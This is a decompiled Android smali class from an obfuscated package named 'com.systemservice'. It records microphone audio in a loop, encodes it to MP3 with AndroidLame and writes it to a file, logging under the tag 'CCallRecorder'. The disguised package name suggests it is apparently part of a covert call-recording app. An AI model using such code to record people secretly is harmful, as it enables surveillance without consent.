.class Lcom/systemservice/a/a/d;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/a/e;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:[S

.field final synthetic b:I

.field final synthetic c:[B

.field final synthetic d:Lcom/systemservice/a/a/e;


# direct methods
.method constructor <init>(Lcom/systemservice/a/a/e;[SI[B)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/a/d;->d:Lcom/systemservice/a/a/e;

    iput-object p2, p0, Lcom/systemservice/a/a/d;->a:[S

    iput p3, p0, Lcom/systemservice/a/a/d;->b:I

    iput-object p4, p0, Lcom/systemservice/a/a/d;->c:[B

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 7

    :cond_0
    :goto_0
    :try_start_0
    invoke-static {}, Ljava/lang/Thread;->interrupted()Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_2

    const-string v1, "CCallRecorder"

    const/4 v2, 0x0

    if-nez v0, :cond_4

    :try_start_1
    iget-object v0, p0, Lcom/systemservice/a/a/d;->d:Lcom/systemservice/a/a/e;

    iget-object v0, v0, Lcom/systemservice/a/a/e;->a:Lcom/systemservice/a/a/g;

    invoke-static {v0}, Lcom/systemservice/a/a/g;->i(Lcom/systemservice/a/a/g;)Landroid/media/AudioRecord;

    move-result-object v0

    iget-object v3, p0, Lcom/systemservice/a/a/d;->a:[S

    iget v4, p0, Lcom/systemservice/a/a/d;->b:I

    invoke-virtual {v0, v3, v2, v4}, Landroid/media/AudioRecord;->read([SII)I

    move-result v0

    if-gez v0, :cond_1

    goto :goto_1

    :cond_1
    if-nez v0, :cond_2

    goto :goto_0

    :cond_2
    iget-object v3, p0, Lcom/systemservice/a/a/d;->d:Lcom/systemservice/a/a/e;

    iget-object v3, v3, Lcom/systemservice/a/a/e;->a:Lcom/systemservice/a/a/g;

    invoke-static {v3}, Lcom/systemservice/a/a/g;->b(Lcom/systemservice/a/a/g;)Lcom/naman14/androidlame/AndroidLame;

    move-result-object v3

    iget-object v4, p0, Lcom/systemservice/a/a/d;->a:[S

    iget-object v5, p0, Lcom/systemservice/a/a/d;->a:[S

    iget-object v6, p0, Lcom/systemservice/a/a/d;->c:[B

    invoke-virtual {v3, v4, v5, v0, v6}, Lcom/naman14/androidlame/AndroidLame;->a([S[SI[B)I

    move-result v0
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_2

    if-gez v0, :cond_3

    goto :goto_1

    :cond_3
    if-eqz v0, :cond_0

    :try_start_2
    iget-object v3, p0, Lcom/systemservice/a/a/d;->d:Lcom/systemservice/a/a/e;

    iget-object v3, v3, Lcom/systemservice/a/a/e;->a:Lcom/systemservice/a/a/g;

    invoke-static {v3}, Lcom/systemservice/a/a/g;->j(Lcom/systemservice/a/a/g;)Ljava/io/FileOutputStream;

    move-result-object v3

    iget-object v4, p0, Lcom/systemservice/a/a/d;->c:[B

    invoke-virtual {v3, v4, v2, v0}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/RuntimeException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_0

    :catch_0
    move-exception v0

    :try_start_3
    invoke-virtual {v0}, Ljava/io/IOException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_4
    :goto_1
    iget-object v0, p0, Lcom/systemservice/a/a/d;->d:Lcom/systemservice/a/a/e;

    iget-object v0, v0, Lcom/systemservice/a/a/e;->a:Lcom/systemservice/a/a/g;

    invoke-static {v0}, Lcom/systemservice/a/a/g;->b(Lcom/systemservice/a/a/g;)Lcom/naman14/androidlame/AndroidLame;

    move-result-object v0

    iget-object v3, p0, Lcom/systemservice/a/a/d;->c:[B

    invoke-virtual {v0, v3}, Lcom/naman14/androidlame/AndroidLame;->a([B)I

    move-result v0
    :try_end_3
    .catch Ljava/lang/RuntimeException; {:try_start_3 .. :try_end_3} :catch_2

    if-eqz v0, :cond_5

    :try_start_4
    iget-object v3, p0, Lcom/systemservice/a/a/d;->d:Lcom/systemservice/a/a/e;

    iget-object v3, v3, Lcom/systemservice/a/a/e;->a:Lcom/systemservice/a/a/g;

    invoke-static {v3}, Lcom/systemservice/a/a/g;->j(Lcom/systemservice/a/a/g;)Ljava/io/FileOutputStream;

    move-result-object v3

    iget-object v4, p0, Lcom/systemservice/a/a/d;->c:[B

    invoke-virtual {v3, v4, v2, v0}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Ljava/lang/RuntimeException; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_2

    :catch_1
    move-exception v0

    :try_start_5
    invoke-virtual {v0}, Ljava/io/IOException;->getLocalizedMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5
    .catch Ljava/lang/RuntimeException; {:try_start_5 .. :try_end_5} :catch_2

    :cond_5
    :goto_2
    :try_start_6
    iget-object v0, p0, Lcom/systemservice/a/a/d;->d:Lcom/systemservice/a/a/e;

    iget-object v0, v0, Lcom/systemservice/a/a/e;->a:Lcom/systemservice/a/a/g;

    invoke-static {v0}, Lcom/systemservice/a/a/g;->j(Lcom/systemservice/a/a/g;)Ljava/io/FileOutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V

    iget-object v0, p0, Lcom/systemservice/a/a/d;->d:Lcom/systemservice/a/a/e;

    iget-object v0, v0, Lcom/systemservice/a/a/e;->a:Lcom/systemservice/a/a/g;

    invoke-static {v0}, Lcom/systemservice/a/a/g;->b(Lcom/systemservice/a/a/g;)Lcom/naman14/androidlame/AndroidLame;

    move-result-object v0

    invoke-virtual {v0}, Lcom/naman14/androidlame/AndroidLame;->a()V
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_3
    .catch Ljava/lang/RuntimeException; {:try_start_6 .. :try_end_6} :catch_2

    goto :goto_3

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/RuntimeException;->printStackTrace()V

    :catch_3
    :goto_3
    return-void
.end method
